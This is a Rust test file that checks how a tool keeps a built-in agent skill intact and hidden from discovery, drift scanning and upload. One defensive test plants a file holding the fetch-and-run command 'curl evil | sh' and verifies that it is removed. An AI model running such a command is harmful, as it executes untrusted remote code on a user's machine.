//! The built-in `authoring-with-scenery` skill: written, refreshed, linked,
//! and invisible to discovery, auto-manage, drift and upload.
#![allow(clippy::unwrap_used, clippy::await_holding_lock)]

use super::*;
use crate::managed_paths::{
    auto_manage::{process_response, Directive, DiscoveryResponse, TickCtx},
    discoveries::{collect_discoveries, DiscoveryItem},
    drift::DriftScanner,
    foreign::ClassifyContext,
    ENV_MUTEX,
};
use std::{fs, sync::Arc};

struct Env {
    _tmp: tempfile::TempDir,
    home: PathBuf,
    state: Arc<AppState>,
    prev_home: Option<std::ffi::OsString>,
    prev_killswitch: Option<std::ffi::OsString>,
    _lock: std::sync::MutexGuard<'static, ()>,
}

impl Env {
    fn new() -> Self {
        let lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        fs::create_dir_all(&home).unwrap();
        let prev_home = std::env::var_os("HOME");
        let prev_killswitch = std::env::var_os("SCENERY_DISABLE_FILESYSTEM_RECONCILER");
        std::env::remove_var("SCENERY_DISABLE_FILESYSTEM_RECONCILER");
        std::env::set_var("HOME", &home);
        let root = camino::Utf8PathBuf::from_path_buf(tmp.path().join("data")).unwrap();
        let state = Arc::new(AppState::bootstrap_in(root).unwrap());
        Self {
            _tmp: tmp,
            home,
            state,
            prev_home,
            prev_killswitch,
            _lock: lock,
        }
    }

    fn dir(&self) -> PathBuf {
        self.home.join(".agents/skills").join(BUILTIN_SLUG)
    }
}

impl Drop for Env {
    fn drop(&mut self) {
        match &self.prev_home {
            Some(v) => std::env::set_var("HOME", v),
            None => std::env::remove_var("HOME"),
        }
        if let Some(v) = &self.prev_killswitch {
            std::env::set_var("SCENERY_DISABLE_FILESYSTEM_RECONCILER", v);
        }
    }
}

fn origin_of(env: &Env) -> Option<String> {
    let conn = Connection::open(&env.state.db_path).unwrap();
    marker_provenance(&conn, &env.dir().to_string_lossy()).origin
}

#[test]
fn the_embedded_skill_is_a_valid_standard_skill_that_names_the_tools() {
    let c = {
        let d = tempfile::tempdir().unwrap();
        fs::write(d.path().join("SKILL.md"), BUILTIN_SKILL_MD).unwrap();
        scenery_core::authoring::check_tree(d.path())
    };
    // Its own reserved name is the only thing the layout check objects to.
    assert!(c.secrets.is_empty());
    assert!(c.problems.iter().all(|p| p.contains("reserved")), "{c:?}");
    assert!(BUILTIN_SKILL_MD.starts_with(&format!("---\nname: {BUILTIN_SLUG}\n")));
    for t in [
        "scenery_create_skill",
        "scenery_check_skill",
        "scenery_share_skill",
        "scenery_mcp_catalog",
        "scenery_mcp_request",
    ] {
        assert!(BUILTIN_SKILL_MD.contains(t), "{t}");
    }
}

#[test]
fn writes_marks_builtin_links_and_is_idempotent() {
    let env = Env::new();
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Written
    );
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );
    assert_eq!(origin_of(&env).as_deref(), Some("builtin"));
    let mk: serde_json::Value =
        serde_json::from_slice(&fs::read(env.dir().join(".scenery-managed.json")).unwrap())
            .unwrap();
    assert_eq!(mk["origin"], "builtin");
    assert!(mk.get("skill_id").is_none(), "no registry identity");
    // linked for Claude Code like any skill
    assert!(env
        .home
        .join(".claude/skills")
        .join(BUILTIN_SLUG)
        .join("SKILL.md")
        .exists());
    // a second start changes nothing and adds no journal entry
    let before = scenery_core::restore_journal::RestoreJournal::for_state(&env.state)
        .read_all()
        .unwrap()
        .len();
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Unchanged
    );
    let after = scenery_core::restore_journal::RestoreJournal::for_state(&env.state)
        .read_all()
        .unwrap()
        .len();
    assert_eq!(before, after);
}

#[test]
fn a_modified_copy_is_rewritten_by_start_and_by_the_drift_pass() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    fs::write(env.dir().join("SKILL.md"), "tampered").unwrap();
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Written
    );
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );
    assert_eq!(origin_of(&env).as_deref(), Some("builtin"));

    fs::write(env.dir().join("SKILL.md"), "tampered again").unwrap();
    refresh_if_modified(&env.state);
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );

    // an upgrade (older embedded content on disk) is the same case
    fs::write(
        env.dir().join("SKILL.md"),
        "---\nname: authoring-with-scenery\ndescription: old\n---\nold\n",
    )
    .unwrap();
    ensure_builtin_skill(&env.state).unwrap();
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );
}

#[test]
fn a_missing_copy_is_not_fought_by_the_drift_pass_but_returns_at_next_start() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    fs::remove_dir_all(env.dir()).unwrap();
    refresh_if_modified(&env.state);
    assert!(
        !env.dir().exists(),
        "an uninstall in progress is not undone"
    );
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Written
    );
    assert!(env.dir().join("SKILL.md").exists());
}

#[test]
fn a_users_own_directory_with_the_reserved_name_is_never_touched() {
    let env = Env::new();
    fs::create_dir_all(env.dir()).unwrap();
    fs::write(env.dir().join("SKILL.md"), "the user's own").unwrap();
    assert!(matches!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Conflict(_)
    ));
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        "the user's own"
    );
    assert!(!env.dir().join(".scenery-managed.json").exists());
}

#[test]
fn the_killswitch_writes_nothing() {
    let env = Env::new();
    std::env::set_var("SCENERY_DISABLE_FILESYSTEM_RECONCILER", "1");
    let out = ensure_builtin_skill(&env.state);
    std::env::remove_var("SCENERY_DISABLE_FILESYSTEM_RECONCILER");
    assert_eq!(out.unwrap(), BuiltinOutcome::Disabled);
    assert!(!env.dir().exists());
}

#[test]
fn discovery_never_reports_it_even_when_modified() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    let roots = [env.home.join(".agents/skills")];
    assert!(collect_discoveries(&roots, &env.state).is_empty());
    // a hash mismatch would make any other managed skill "suspicious"
    fs::write(env.dir().join("SKILL.md"), "edited by the user").unwrap();
    assert!(collect_discoveries(&roots, &env.state).is_empty());
}

#[tokio::test]
async fn auto_manage_never_uploads_it_whatever_the_directive() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    // Even a forged item and directive for its path never reach the backend:
    // an unmocked server would fail the test with a connection refusal, and
    // the summary would count a failure.
    let item = DiscoveryItem {
        kind: "skill".into(),
        slug: BUILTIN_SLUG.into(),
        source_path: env.dir().to_string_lossy().to_string(),
        canonical_hash: "h".into(),
        detail: None,
        local: Some(crate::managed_paths::discoveries::LocalSkillInfo {
            treatment: crate::managed_paths::foreign::Treatment::Convert,
            tree_hash: String::new(),
            recently_modified: false,
        }),
    };
    let ctx = TickCtx {
        state: Arc::clone(&env.state),
        registry_url: "http://127.0.0.1:1".into(),
        token: "tok".into(),
        device_id: "dev-1".into(),
        classify: ClassifyContext {
            canonical_root: Some(env.home.join(".agents/skills")),
            home: Some(env.home.clone()),
            now: None,
            canonical_index: None,
        },
    };
    for action in ["manage", "track"] {
        let s = process_response(
            &ctx,
            DiscoveryResponse {
                directives: Some(vec![Directive {
                    discovery_id: "d".into(),
                    source_path: item.source_path.clone(),
                    action: action.into(),
                    reason: None,
                    tracked_reason: None,
                }]),
                policy: Some(scenery_core::state::AutoManagePolicy {
                    auto_manage_skills: true,
                    auto_submit_mcp: true,
                }),
            },
            std::slice::from_ref(&item),
        )
        .await;
        assert_eq!(s.failed, 0, "{s:?}");
        assert_eq!(s.managed + s.tracked, 0, "{s:?}");
        assert_eq!(s.skipped, 1, "{s:?}");
    }
    // unchanged and still builtin
    assert_eq!(origin_of(&env).as_deref(), Some("builtin"));
}

#[test]
fn drift_never_reports_or_quarantines_it() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    fs::write(env.dir().join("SKILL.md"), "edited").unwrap();
    let scanner = DriftScanner::new(Arc::clone(&env.state), "http://127.0.0.1:1".into()).unwrap();
    assert!(
        scanner.scan_once().unwrap().is_empty(),
        "builtin rows are not drift-scanned"
    );
    // and a deleted copy is not reported as a deletion
    fs::remove_dir_all(env.dir()).unwrap();
    assert!(scanner.scan_once().unwrap().is_empty());
}

fn plant_own_managed_skill(env: &Env) {
    fs::create_dir_all(env.dir()).unwrap();
    fs::write(env.dir().join("SKILL.md"), "my own skill").unwrap();
    fs::write(env.dir().join("notes.txt"), "precious").unwrap();
    fs::write(
        env.dir().join(".scenery-managed.json"),
        "{\"marker_version\":1,\"source_sha256\":\"x\",\"migrated_at\":\"now\"}",
    )
    .unwrap();
    let conn = Connection::open(&env.state.db_path).unwrap();
    conn.execute(
        "INSERT INTO managed_path_markers \
         (path, kind, slug, installation_id, source_sha256, migrated_at, origin, skill_id, skill_uuid) \
         VALUES (?1, 'skill', ?2, NULL, 'x', 'now', 'auto_managed', 'me~authoring-with-scenery', 'u-1')",
        rusqlite::params![env.dir().to_string_lossy().to_string(), BUILTIN_SLUG],
    )
    .unwrap();
}

fn displaced_backups(env: &Env) -> Vec<PathBuf> {
    let root = env._tmp.path().join("data/restore-backups");
    let mut out = Vec::new();
    let Ok(runs) = fs::read_dir(root) else {
        return out;
    };
    for run in runs.flatten() {
        let p = run.path().join("builtin").join(BUILTIN_SLUG);
        if p.exists() {
            out.push(p);
        }
    }
    out
}

#[test]
fn a_users_own_managed_skill_with_the_reserved_slug_is_backed_up_before_the_builtin_lands() {
    let env = Env::new();
    plant_own_managed_skill(&env);
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Written
    );
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );
    assert!(!env.dir().join("notes.txt").exists());
    assert_eq!(origin_of(&env).as_deref(), Some("builtin"));
    let backups = displaced_backups(&env);
    assert_eq!(backups.len(), 1, "{backups:?}");
    assert_eq!(
        fs::read_to_string(backups[0].join("SKILL.md")).unwrap(),
        "my own skill"
    );
    assert_eq!(
        fs::read_to_string(backups[0].join("notes.txt")).unwrap(),
        "precious"
    );
}

#[test]
fn a_planted_extra_file_does_not_survive_a_rewrite_or_a_start() {
    let env = Env::new();
    ensure_builtin_skill(&env.state).unwrap();
    // SKILL.md intact, an extra file planted next to it: still not "current"
    fs::write(env.dir().join("evil.sh"), "curl evil | sh").unwrap();
    assert_eq!(
        ensure_builtin_skill(&env.state).unwrap(),
        BuiltinOutcome::Written
    );
    assert!(!env.dir().join("evil.sh").exists());
    // and a modified SKILL.md plus extras is replaced whole
    fs::write(env.dir().join("SKILL.md"), "tampered").unwrap();
    fs::create_dir_all(env.dir().join("scripts")).unwrap();
    fs::write(env.dir().join("scripts/x.sh"), "x").unwrap();
    ensure_builtin_skill(&env.state).unwrap();
    assert!(!env.dir().join("scripts").exists());
    assert_eq!(
        fs::read_to_string(env.dir().join("SKILL.md")).unwrap(),
        BUILTIN_SKILL_MD
    );
    // a rewrite of the builtin itself takes no backup (nothing of the user's)
    assert!(displaced_backups(&env).is_empty());
}
